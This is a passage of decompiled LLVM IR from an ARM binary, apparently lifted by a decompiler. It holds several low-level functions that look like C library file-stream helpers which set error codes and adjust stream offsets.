  store i8 %v3_1886c, i8* %v4_18870, align 1
  %v0_18874 = load i32, i32* @r7, align 4
  %v1_18874 = add i32 %v0_18874, 16
  %v2_18874 = inttoptr i32 %v1_18874 to i16*
  %v3_18874 = load i16, i16* %v2_18874, align 2
  %v4_18874 = zext i16 %v3_18874 to i32
  %v1_18878 = add nsw i32 %v4_18874, -19
  store i32 %v1_18878, i32* @r2, align 4
  %v0_1887c = call i32 @function_12050()
  %v0_18880 = load i32, i32* @r7, align 4
  %v1_18880 = add i32 %v0_18880, 16
  %v2_18880 = inttoptr i32 %v1_18880 to i16*
  %v3_18880 = load i16, i16* %v2_18880, align 2
  %v4_18880 = zext i16 %v3_18880 to i32
  %v0_18884 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_18884, i32* @r5, align 4
  %v2_18888 = add i32 %v4_18880, %v0_18880
  store i32 %v2_18888, i32* @r7, align 4
  br label %dec_label_pc_1888c

dec_label_pc_1888c:                               ; preds = %dec_label_pc_187d8, %dec_label_pc_18848
  %v0_18854 = phi i32 [ %tmp, %dec_label_pc_187d8 ], [ %v0_18884, %dec_label_pc_18848 ]
  %v0_1884c = phi i32 [ %v1_1878c, %dec_label_pc_187d8 ], [ %v2_18888, %dec_label_pc_18848 ]
  %v3_18890 = icmp ult i32 %v0_1884c, %v2_187d8
  %v1_18894 = add i32 %v0_18854, 19
  store i32 %v1_18894, i32* @r0, align 4
  %v1_18898 = add i32 %v0_1884c, 19
  store i32 %v1_18898, i32* @r1, align 4
  br i1 %v3_18890, label %dec_label_pc_187f8, label %dec_label_pc_188a0.loopexit

dec_label_pc_188a0.loopexit:                      ; preds = %dec_label_pc_1888c
  %v0_188a0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_188a0

dec_label_pc_188a0:                               ; preds = %dec_label_pc_188a0.loopexit, %dec_label_pc_18814
  %v1_188a0 = phi i32 [ %v0_18854, %dec_label_pc_188a0.loopexit ], [ %v0_1882c, %dec_label_pc_18814 ]
  %v0_188a0 = phi i32 [ %v0_188a0.pre, %dec_label_pc_188a0.loopexit ], [ %v1_1882c, %dec_label_pc_18814 ]
  %v2_188a0 = sub i32 %v1_188a0, %v0_188a0
  store i32 %v2_188a0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_188a4

dec_label_pc_188a4:                               ; preds = %dec_label_pc_18834, %dec_label_pc_187d0, %dec_label_pc_188a0
  %v0_188a4 = phi i32 [ %v0_188a4.pre, %dec_label_pc_18834 ], [ %v0_187d0, %dec_label_pc_187d0 ], [ %v2_188a0, %dec_label_pc_188a0 ]
  store i32 %v3_18774, i32* %r4.global-to-local, align 4
  store i32 %v6_18774, i32* @r5, align 4
  store i32 %v12_18774, i32* @r7, align 4
  ret i32 %v0_188a4

; uselistorder directives
  uselistorder i32 %v0_1884c, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_18854, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_1878c, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 1, 2, 0, 3 }
  uselistorder i32 ()* @function_12050, { 12, 11, 10, 8, 7, 6, 0, 5, 4, 3, 9, 2, 1 }
  uselistorder i32 18, { 2, 3, 4, 0, 1 }
  uselistorder i32* @sp, { 0, 2, 33, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 7, { 12, 0, 1, 10, 11, 2, 20, 13, 14, 15, 3, 4, 5, 16, 17, 6, 18, 7, 9, 19, 8 }
  uselistorder i32 14, { 3, 0, 7, 4, 6, 1, 2, 5 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_188a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1888c, { 1, 0 }
}

define i32 @function_188b4() local_unnamed_addr {
dec_label_pc_188b4:
  %v0_188c0 = load i32, i32* @r1, align 4
  store i32 %v0_188c0, i32* @r2, align 4
  %v0_188c8 = call i32 @function_188d8()
  ret i32 %v0_188c8
}

define i32 @function_188d8() local_unnamed_addr {
dec_label_pc_188d8:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_188d8 = load i32, i32* @r4, align 4
  %v6_188d8 = load i32, i32* @r5, align 4
  %v12_188d8 = load i32, i32* @r7, align 4
  store i32 %tmp14, i32* @r7, align 4
  %v0_188ec = load i32, i32* @r2, align 4
  store i32 %v0_188ec, i32* %stack_var_-32, align 4
  store i32 144312, i32* %r6.global-to-local, align 4
  %v0_188f8 = load i32, i32* @r0, align 4
  store i32 %v0_188f8, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp14, 3
  br i1 %tmp, label %dec_label_pc_18914, label %dec_label_pc_18900

dec_label_pc_18900:                               ; preds = %dec_label_pc_188d8
  %v0_18900 = call i32 @function_1095c()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1890c = inttoptr i32 %v0_18900 to i32*
  store i32 22, i32* %v2_1890c, align 4
  br label %dec_label_pc_18a04

dec_label_pc_18914:                               ; preds = %dec_label_pc_188d8
  %v1_18914 = add i32 %v0_188f8, 52
  %v2_18914 = inttoptr i32 %v1_18914 to i32*
  %v3_18914 = load i32, i32* %v2_18914, align 4
  %v1_18918 = sub i32 1, %v3_18914
  store i32 %v1_18918, i32* %r8.global-to-local, align 4
  %v2_18918 = icmp ult i32 %v3_18914, 2
  br i1 %v2_18918, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_18914
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18960

bb:                                               ; preds = %dec_label_pc_18914
  %v2_18920 = icmp eq i32 %v1_18918, 0
  br i1 %v2_18920, label %dec_label_pc_18960, label %dec_label_pc_18928

dec_label_pc_18928:                               ; preds = %bb
  %v1_1892c = add i32 %v0_188f8, 56
  store i32 %v1_1892c, i32* @r4, align 4
  %v4_18930 = load i32, i32* inttoptr (i32 144352 to i32*), align 32
  store i32 %v4_18930, i32* %r1.global-to-local, align 4
  %v4_18940 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_18940)
  %v0_18954 = load i32, i32* %r6.global-to-local, align 4
  %v2_18954 = add i32 %v0_18954, 20
  %v3_18954 = inttoptr i32 %v2_18954 to i32*
  %v4_18954 = load i32, i32* %v3_18954, align 4
  store i32 %v4_18954, i32* @ip, align 4
  store i32 100704, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18954)
  %v0_18960.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18960

dec_label_pc_18960:                               ; preds = %.thread, %bb, %dec_label_pc_18928
  %v0_1896c = phi i32 [ %v0_188f8, %.thread ], [ %v0_188f8, %bb ], [ %v0_18960.pre, %dec_label_pc_18928 ]
  %v1_18960 = inttoptr i32 %v0_1896c to i16*
  %v2_18960 = load i16, i16* %v1_18960, align 2
  %v1_18964 = and i16 %v2_18960, 64
  %v2_18964 = icmp eq i16 %v1_18964, 0
  br i1 %v2_18964, label %dec_label_pc_1897c, label %dec_label_pc_1896c

dec_label_pc_1896c:                               ; preds = %dec_label_pc_18960
  store i32 %v0_1896c, i32* @r0, align 4
  %v0_18970 = call i32 @function_10c14()
  %v2_18974 = icmp eq i32 %v0_18970, 0
  br i1 %v2_18974, label %dec_label_pc_1897c, label %dec_label_pc_189e4

dec_label_pc_1897c:                               ; preds = %dec_label_pc_1896c, %dec_label_pc_18960
  %v0_1897c = load i32, i32* @r7, align 4
  %v7_1897c = icmp eq i32 %v0_1897c, 1
  br i1 %v7_1897c, label %dec_label_pc_18984, label %dec_label_pc_1897c.dec_label_pc_18998_crit_edge

dec_label_pc_1897c.dec_label_pc_18998_crit_edge:  ; preds = %dec_label_pc_1897c
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_18998

dec_label_pc_18984:                               ; preds = %dec_label_pc_1897c
  %v0_18984 = load i32, i32* @r5, align 4
  %v2_18988 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_18988, i32* %r1.global-to-local, align 4
  %v2_1898c = inttoptr i32 %v0_18984 to i16*
  %v3_1898c = call i32 @function_18a80(i16* %v2_1898c, i32 %v2_18988)
  %v1_18990 = icmp slt i32 %v3_1898c, 0
  br i1 %v1_18990, label %dec_label_pc_189e4, label %dec_label_pc_18984.dec_label_pc_18998_crit_edge

dec_label_pc_18984.dec_label_pc_18998_crit_edge:  ; preds = %dec_label_pc_18984
  %v0_18998.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18998

dec_label_pc_18998:                               ; preds = %dec_label_pc_1897c.dec_label_pc_18998_crit_edge, %dec_label_pc_18984.dec_label_pc_18998_crit_edge
  %v2_189a0.pre-phi = phi i32 [ %.pre, %dec_label_pc_1897c.dec_label_pc_18998_crit_edge ], [ %v2_18988, %dec_label_pc_18984.dec_label_pc_18998_crit_edge ]
  %v0_18998 = phi i32 [ %v0_1897c, %dec_label_pc_1897c.dec_label_pc_18998_crit_edge ], [ %v0_18998.pre, %dec_label_pc_18984.dec_label_pc_18998_crit_edge ]
  %v0_1899c = load i32, i32* @r5, align 4
  store i32 %v2_189a0.pre-phi, i32* %r1.global-to-local, align 4
  %v4_189a4 = call i32 @function_18c0c(i32 %v0_1899c, i32* nonnull %stack_var_-32, i32 %v0_18998)
  %v1_189a8 = icmp slt i32 %v4_189a4, 0
  br i1 %v1_189a8, label %dec_label_pc_189e4, label %dec_label_pc_189b0

dec_label_pc_189b0:                               ; preds = %dec_label_pc_18998
  %v0_189b0 = load i32, i32* @r5, align 4
  %v1_189b0 = inttoptr i32 %v0_189b0 to i16*
  %v2_189b0 = load i16, i16* %v1_189b0, align 2
  %v1_189b4 = add i32 %v0_189b0, 8
  %v2_189b4 = inttoptr i32 %v1_189b4 to i32*
  %v3_189b4 = load i32, i32* %v2_189b4, align 4
  store i32 %v3_189b4, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_189bc = and i16 %v2_189b0, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_189bc, i16* %v1_189b0, align 2
  %v0_189c8 = load i32, i32* @r2, align 4
  %v1_189c8 = load i32, i32* @r5, align 4
  %v2_189c8 = add i32 %v1_189c8, 28
  %v3_189c8 = inttoptr i32 %v2_189c8 to i32*
  store i32 %v0_189c8, i32* %v3_189c8, align 4
  %v0_189cc = load i32, i32* %r1.global-to-local, align 4
  %v1_189cc = trunc i32 %v0_189cc to i8
  %v2_189cc = load i32, i32* @r5, align 4
  %v3_189cc = add i32 %v2_189cc, 2
  %v4_189cc = inttoptr i32 %v3_189cc to i8*
  store i8 %v1_189cc, i8* %v4_189cc, align 1
  %v0_189d0 = load i32, i32* @r2, align 4
  %v1_189d0 = load i32, i32* @r5, align 4
  %v2_189d0 = add i32 %v1_189d0, 16
  %v3_189d0 = inttoptr i32 %v2_189d0 to i32*
  store i32 %v0_189d0, i32* %v3_189d0, align 4
  %v0_189d4 = load i32, i32* @r2, align 4
  %v1_189d4 = load i32, i32* @r5, align 4
  %v2_189d4 = add i32 %v1_189d4, 20
  %v3_189d4 = inttoptr i32 %v2_189d4 to i32*
  store i32 %v0_189d4, i32* %v3_189d4, align 4
  %v0_189d8 = load i32, i32* @r2, align 4
  %v1_189d8 = load i32, i32* @r5, align 4
  %v2_189d8 = add i32 %v1_189d8, 24
  %v3_189d8 = inttoptr i32 %v2_189d8 to i32*
  store i32 %v0_189d8, i32* %v3_189d8, align 4
  %v0_189dc = load i32, i32* %r1.global-to-local, align 4
  %v1_189dc = load i32, i32* @r5, align 4
  %v2_189dc = add i32 %v1_189dc, 44
  %v3_189dc = inttoptr i32 %v2_189dc to i32*
  store i32 %v0_189dc, i32* %v3_189dc, align 4
  br label %dec_label_pc_189e8

dec_label_pc_189e4:                               ; preds = %dec_label_pc_1896c, %dec_label_pc_18998, %dec_label_pc_18984
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_189e8

dec_label_pc_189e8:                               ; preds = %dec_label_pc_189b0, %dec_label_pc_189e4
  %v0_189e8 = load i32, i32* %r8.global-to-local, align 4
  %v2_189e8 = icmp eq i32 %v0_189e8, 0
  br i1 %v2_189e8, label %dec_label_pc_189e8..thread6_crit_edge, label %bb18

dec_label_pc_189e8..thread6_crit_edge:            ; preds = %dec_label_pc_189e8
  %v0_18a00.pre = load i32, i32* @ip, align 4
  br label %.thread6

bb18:                                             ; preds = %dec_label_pc_189e8
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_189f8 = load i32, i32* %r6.global-to-local, align 4
  %v3_189f8 = add i32 %v1_189f8, 28
  %v4_189f8 = inttoptr i32 %v3_189f8 to i32*
  %v5_189f8 = load i32, i32* %v4_189f8, align 4
  store i32 %v5_189f8, i32* @ip, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_189e8..thread6_crit_edge, %bb18
  %v0_18a00 = phi i32 [ %v0_18a00.pre, %dec_label_pc_189e8..thread6_crit_edge ], [ %v5_189f8, %bb18 ]
  %v2_18a00 = xor i1 %v2_189e8, true
  call void @__pseudo_cond_branch(i1 %v2_18a00, i32 %v0_18a00)
  br label %dec_label_pc_18a04

dec_label_pc_18a04:                               ; preds = %dec_label_pc_18900, %.thread6
  %v0_18a04 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_188d8, i32* @r4, align 4
  store i32 %v6_188d8, i32* @r5, align 4
  store i32 %v12_188d8, i32* @r7, align 4
  ret i32 %v0_18a04

; uselistorder directives
  uselistorder i32 %v3_18914, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 24, { 36, 20, 24, 25, 26, 0, 27, 28, 29, 30, 31, 32, 37, 33, 4, 34, 21, 22, 23, 5, 1, 38, 39, 40, 41, 42, 43, 44, 45, 35, 46, 47, 48, 49, 2, 3, 17, 15, 16, 13, 14, 11, 12, 10, 8, 9, 50, 18, 6, 7, 19 }
  uselistorder i32* inttoptr (i32 144388 to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 15, 16 }
  uselistorder i32* inttoptr (i32 144352 to i32*), { 0, 1, 4, 2, 3 }
  uselistorder i32 56, { 8, 3, 4, 5, 6, 2, 7, 0, 1, 9, 10 }
  uselistorder i32 22, { 3, 4, 0, 13, 5, 6, 7, 8, 14, 9, 10, 11, 15, 12, 1, 2 }
  uselistorder i32 144312, { 0, 50, 3, 4, 2, 1, 5, 6, 7, 51, 52, 8, 9, 10, 11, 53, 12, 13, 54, 14, 15, 55, 16, 56, 57, 58, 59, 60, 61, 62, 63, 17, 45, 41, 39, 38, 40, 42, 43, 44, 37, 46, 32, 34, 33, 31, 30, 35, 36, 27, 26, 29, 28, 25, 24, 23, 22, 47, 48, 49, 64, 18, 65, 19, 20, 66, 21, 67, 68 }
  uselistorder i32* @r7, { 80, 4, 81, 82, 83, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 44, 45, 46, 47, 48, 49, 5, 50, 51, 52, 6, 53, 54, 55, 17, 56, 57, 7, 58, 59, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 148, 149, 150, 151, 152, 153, 154, 8, 155, 156, 157, 158, 159, 160, 111, 1, 112, 113, 114, 115, 9, 116, 117, 60, 61, 62, 63, 10, 64, 65, 66, 67, 68, 69, 30, 31, 36, 37, 38, 39, 32, 33, 34, 35, 40, 41, 42, 43, 222, 223, 118, 119, 196, 197, 187, 188, 18, 189, 185, 186, 224, 225, 226, 231, 232, 11, 70, 71, 161, 12, 162, 163, 164, 2, 165, 166, 73, 74, 3, 75, 72, 170, 171, 13, 172, 76, 77, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 14, 215, 216, 217, 175, 176, 218, 219, 181, 182, 146, 147, 179, 180, 167, 15, 168, 169, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 134, 135, 78, 79, 130, 131, 132, 133, 136, 137, 0, 138, 139, 16, 140, 141, 190, 191, 229, 230, 142, 143, 220, 221, 173, 174, 227, 228, 183, 184, 144, 145, 177, 178, 192, 193, 194, 195 }
  uselistorder label %dec_label_pc_18a04, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_189e8, { 1, 0 }
  uselistorder label %dec_label_pc_189e4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18998, { 1, 0 }
  uselistorder label %dec_label_pc_18960, { 2, 1, 0 }
}

define i32 @function_18a18(i32 %arg1) local_unnamed_addr {
dec_label_pc_18a18:
  %v0_18a18 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18a18, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_18a18
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18a18, %bb
  %v10_18a24 = phi i32 [ %arg1, %dec_label_pc_18a18 ], [ 0, %bb ]
  ret i32 %v10_18a24

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_18a28(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_18a28:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18a28 = load i32, i32* @r4, align 4
  store i32 %v3_18a28, i32* %stack_var_-12, align 4
  %v0_18a2c = load i32, i32* %r0.global-to-local, align 4
  %v1_18a2c = inttoptr i32 %v0_18a2c to i16*
  %v2_18a2c = load i16, i16* %v1_18a2c, align 2
  %v3_18a2c = zext i16 %v2_18a2c to i32
  %v1_18a30 = and i32 %v3_18a2c, 4
  store i32 %v1_18a30, i32* %r5.global-to-local, align 4
  %v2_18a30 = icmp eq i32 %v1_18a30, 0
  store i32 %v0_18a2c, i32* %r4.global-to-local, align 4
  br i1 %v2_18a30, label %dec_label_pc_18a44, label %bb

bb:                                               ; preds = %dec_label_pc_18a28
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_18a44:                               ; preds = %dec_label_pc_18a28
  %v1_18a44 = icmp slt i32 %arg2, 0
  br i1 %v1_18a44, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_18a44
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_18a44, %bb18
  %v1_18a4c = add i32 %v0_18a2c, 4
  %v2_18a4c = inttoptr i32 %v1_18a4c to i32*
  %v3_18a4c = load i32, i32* %v2_18a4c, align 4
  store i32 %v3_18a4c, i32* %r0.global-to-local, align 4
  %v1_18a50 = call i32 @function_10610(i32 %v3_18a4c)
  store i32 %v1_18a50, i32* %r0.global-to-local, align 4
  %v5_18a58 = icmp sgt i32 %v1_18a50, 0
  br i1 %v5_18a58, label %.thread7, label %dec_label_pc_18a5c

dec_label_pc_18a5c:                               ; preds = %bb19
  %v2_18a54 = icmp eq i32 %v1_18a50, 0
  %v0_18a5c = load i32, i32* %r4.global-to-local, align 4
  %v1_18a5c = inttoptr i32 %v0_18a5c to i16*
  %v2_18a5c = load i16, i16* %v1_18a5c, align 2
  br i1 %v2_18a54, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_18a5c
  %v2_18a60 = or i16 %v2_18a5c, 4
  store i16 %v2_18a60, i16* %v1_18a5c, align 2
  %v1_18a7c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_18a5c
  %v2_18a64 = or i16 %v2_18a5c, 8
  store i16 %v2_18a64, i16* %v1_18a5c, align 2
  %v1_18a70 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_18a70, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_18a7c = phi i32 [ %v1_18a7c.pre, %bb20 ], [ 0, %bb ], [ %v1_18a50, %bb19 ], [ %v1_18a70, %bb21 ]
  %v2_18a78 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18a78, i32* @r4, align 4
  ret i32 %v1_18a7c

; uselistorder directives
  uselistorder i16 %v2_18a5c, { 1, 0 }
  uselistorder i32 %v1_18a50, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_10610, { 1, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_18a80(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_18a80:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18a80 = load i32, i32* @r4, align 4
  store i32 %v3_18a80, i32* %stack_var_-12, align 4
  %v3_18a84 = load i16, i16* %arg1, align 2
  %v4_18a84 = zext i16 %v3_18a84 to i32
  store i32 %v4_18a84, i32* @ip, align 4
  %tmp17 = urem i16 %v3_18a84, 4
  %v1_18a88 = zext i16 %tmp17 to i32
  store i32 %v1_18a88, i32* @r2, align 4
  %v2_18a88 = icmp eq i16 %tmp17, 0
  br i1 %v2_18a88, label %bb, label %dec_label_pc_18a9c

bb:                                               ; preds = %dec_label_pc_18a80
  br label %bb14

dec_label_pc_18a9c:                               ; preds = %dec_label_pc_18a80
  %v1_18a9c = add nsw i32 %v1_18a88, -1
  %v7_18a9c = icmp eq i16 %tmp17, 1
  br i1 %v7_18a9c, label %bb14, label %dec_label_pc_18aa4

dec_label_pc_18aa4:                               ; preds = %dec_label_pc_18a9c
  %v1_18aa4 = and i32 %v4_18a84, 2048
  %v2_18aa4 = icmp eq i32 %v1_18aa4, 0
  br i1 %v2_18aa4, label %bb14, label %dec_label_pc_18aac

dec_label_pc_18aac:                               ; preds = %dec_label_pc_18aa4
  %v7_18aac = icmp eq i32 %v1_18a9c, 2
  br i1 %v7_18aac, label %dec_label_pc_18b30, label %dec_label_pc_18ab4

dec_label_pc_18ab4:                               ; preds = %dec_label_pc_18aac
  %v2_18ab4 = add i32 %tmp, 40
  %v3_18ab4 = inttoptr i32 %v2_18ab4 to i32*
  %v4_18ab4 = load i32, i32* %v3_18ab4, align 4
  store i32 %v4_18ab4, i32* %r3.global-to-local, align 4
  %v2_18ab8 = icmp eq i32 %v4_18ab4, 0
  br i1 %v2_18ab8, label %dec_label_pc_18ac0, label %dec_label_pc_18b30

dec_label_pc_18ac0:                               ; preds = %dec_label_pc_18ab4
  %v2_18ac0 = add i32 %tmp, 44
  %v3_18ac0 = inttoptr i32 %v2_18ac0 to i32*
  %v4_18ac0 = load i32, i32* %v3_18ac0, align 4
  store i32 %v4_18ac0, i32* %r3.global-to-local, align 4
  %v2_18ac4 = add i32 %tmp, 3
  %v3_18ac4 = inttoptr i32 %v2_18ac4 to i8*
  %v4_18ac4 = load i8, i8* %v3_18ac4, align 1
  %v5_18ac4 = zext i8 %v4_18ac4 to i32
  %v2_18ac8 = icmp eq i32 %v4_18ac0, 0
  br i1 %v2_18ac8, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_18ac0
  %v1_18ad03 = sub nsw i32 0, %v5_18ac4
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_18ac0
  %v3_18acc = add i32 %tmp, 2
  %v4_18acc = inttoptr i32 %v3_18acc to i8*
  %v5_18acc = load i8, i8* %v4_18acc, align 1
  %v6_18acc = zext i8 %v5_18acc to i32
  store i32 %v6_18acc, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_18acc, %v5_18ac4
  %v3_18ad4 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_18aa4, %dec_label_pc_18a9c, %bb13
  %v1_18ae8 = phi i32 [ %v1_18ad03, %.thread1 ], [ %v1_18a9c, %dec_label_pc_18aa4 ], [ %v1_18a9c, %dec_label_pc_18a9c ], [ 0, %bb ], [ %v3_18ad4, %bb13 ]
  %v1_18ad8 = and i32 %v4_18a84, 64
  %v2_18ad8 = icmp eq i32 %v1_18ad8, 0
  %v2_18adc = add i32 %tmp, 16
  %v3_18adc = inttoptr i32 %v2_18adc to i32*
  %v4_18adc = load i32, i32* %v3_18adc, align 4
  store i32 %v4_18adc, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_18ad8, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_18ae8 = sub i32 %v1_18ae8, %v4_18adc
  store i32 %v2_18ae8, i32* %r3.global-to-local, align 4
  %v1_18aec = inttoptr i32 %arg2 to i32*
  %v2_18aec = load i32, i32* %v1_18aec, align 4
  store i32 %v2_18aec, i32* %r0.global-to-local, align 4
  %v3_18aec = add i32 %arg2, 4
  %v4_18aec = inttoptr i32 %v3_18aec to i32*
  %v5_18aec = load i32, i32* %v4_18aec, align 4
  %v2_18af0 = add i32 %storemerge, %v2_18ae8
  store i32 %v2_18af0, i32* %r4.global-to-local, align 4
  %v2_18af4 = sub i32 %v2_18aec, %v2_18af0
  store i32 %v2_18af4, i32* @r2, align 4
  %v2_18af8 = and i32 %v2_18af0, 1073741824
  %v3_18af8 = icmp ne i32 %v2_18af8, 0
  %v4_18af8 = ashr i32 %v2_18af0, 31
  %v6_18af8 = icmp eq i1 %v3_18af8, false
  %v7_18af8 = sub i32 %v5_18aec, %v4_18af8
  %v9_18af8 = sext i1 %v6_18af8 to i32
  %v10_18af8 = add i32 %v7_18af8, %v9_18af8
  store i32 %v10_18af8, i32* %r3.global-to-local, align 4
  %v2_18afc = sub i32 %v10_18af8, %v5_18aec
  %v4_18afc = xor i32 %v10_18af8, %v5_18aec
  %v5_18afc = xor i32 %v2_18afc, %v10_18af8
  %v6_18afc = and i32 %v5_18afc, %v4_18afc
  %v7_18afc = icmp slt i32 %v6_18afc, 0
  %v8_18afc = icmp slt i32 %v2_18afc, 0
  %v9_18afc = icmp eq i32 %v10_18af8, %v5_18aec
  store i32 %v2_18af4, i32* %v1_18aec, align 4
  %v5_18b00 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_18b00, i32* %v4_18aec, align 4
  %v3_18b04 = xor i1 %v8_18afc, %v7_18afc
  %v4_18b04 = or i1 %v9_18afc, %v3_18b04
  br i1 %v4_18b04, label %dec_label_pc_18b08, label %dec_label_pc_18b14

dec_label_pc_18b08:                               ; preds = %bb14
  br i1 %v9_18afc, label %dec_label_pc_18b0c, label %dec_label_pc_18b18thread-pre-split

dec_label_pc_18b0c:                               ; preds = %dec_label_pc_18b08
  %v0_18b0c = load i32, i32* @r2, align 4
  %v1_18b0c = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_18b0c, %v1_18b0c
  br i1 %tmp18, label %dec_label_pc_18b14, label %dec_label_pc_18b18thread-pre-split

dec_label_pc_18b14:                               ; preds = %dec_label_pc_18b0c, %bb14
  %v0_18b14 = load i32, i32* %r4.global-to-local, align 4
  %v1_18b14 = sub i32 0, %v0_18b14
  store i32 %v1_18b14, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18b18

dec_label_pc_18b18thread-pre-split:               ; preds = %dec_label_pc_18b0c, %dec_label_pc_18b08
  %v0_18b18.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18b18

dec_label_pc_18b18:                               ; preds = %dec_label_pc_18b18thread-pre-split, %dec_label_pc_18b14
  %v0_18b18 = phi i32 [ %v0_18b18.pr, %dec_label_pc_18b18thread-pre-split ], [ %v1_18b14, %dec_label_pc_18b14 ]
  %v1_18b18 = icmp slt i32 %v0_18b18, 0
  br i1 %v1_18b18, label %dec_label_pc_18b20, label %dec_label_pc_18b34

dec_label_pc_18b20:                               ; preds = %dec_label_pc_18b18
  %v0_18b20 = call i32 @function_1095c()
  store i32 %v0_18b20, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_18b28 = inttoptr i32 %v0_18b20 to i32*
  store i32 75, i32* %v2_18b28, align 4
  %v0_18b34.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18b34

dec_label_pc_18b30:                               ; preds = %dec_label_pc_18ab4, %dec_label_pc_18aac
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18b34

dec_label_pc_18b34:                               ; preds = %dec_label_pc_18b18, %dec_label_pc_18b20, %dec_label_pc_18b30
  %v0_18b34 = phi i32 [ %v0_18b18, %dec_label_pc_18b18 ], [ %v0_18b34.pre, %dec_label_pc_18b20 ], [ -1, %dec_label_pc_18b30 ]
